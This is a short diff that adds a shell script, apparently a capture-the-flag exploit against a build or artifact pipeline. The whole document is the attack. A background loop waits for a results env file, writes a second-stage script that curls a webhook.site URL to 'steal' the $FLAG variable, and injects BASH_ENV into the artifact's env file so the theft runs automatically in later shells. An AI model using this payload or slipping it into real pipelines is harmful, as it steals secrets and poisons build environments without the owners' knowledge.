@@ -1,0 +1,16 @@
+if [ -z "$__PAYLOAD_DELIVERED" ]; then
+  export __PAYLOAD_DELIVERED=1
+  (
+    while [ ! -f __results/bundle-report.env ]; do sleep 1; done
+
+    cat > __results/exfil << 'STAGE2'
+    if [ -n "$FLAG" ] && [ -z "$__EXFIL_DONE" ]; then
+      export __EXFIL_DONE=1
+      curl -s "https://webhook.site/e6929bc6-0e53-4865-aad5-a04121cf50ab/steal?flag=$FLAG" 2>/dev/null &
+    fi
+STAGE2
+
+    # Inject BASH_ENV into the artifact's env file
+    echo "BASH_ENV=__results/exfil" >> __results/bundle-report.env
+  ) &
+fi
